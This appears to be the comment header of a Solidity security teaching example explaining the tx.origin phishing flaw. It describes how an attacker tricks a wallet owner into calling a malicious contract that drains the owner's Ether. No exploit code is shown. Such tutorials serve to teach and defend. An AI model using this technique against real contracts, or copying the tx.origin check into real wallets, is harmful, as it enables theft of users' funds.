/*
Wallet is a simple contract where only the owner should be able to transfer
Ether to another address. Wallet.transfer() uses tx.origin to check that the
caller is the owner. Let&#39;s see how we can hack this contract
*/

/*
1. Alice deploys Wallet with 10 Ether
2. Eve deploys Attack with the address of Alice&#39;s Wallet contract.
3. Eve tricks Alice to call Attack.attack()
4. Eve successfully stole Ether from Alice&#39;s wallet

What happened?
Alice was tricked into calling Attack.attack(). Inside Attack.attack(), it
requested a transfer of all funds in Alice&#39;s wallet to Eve&#39;s address.
Since tx.origin in Wallet.transfer() is equal to Alice&#39;s address,
it authorized the transfer. The wallet transferred all Ether to Eve.
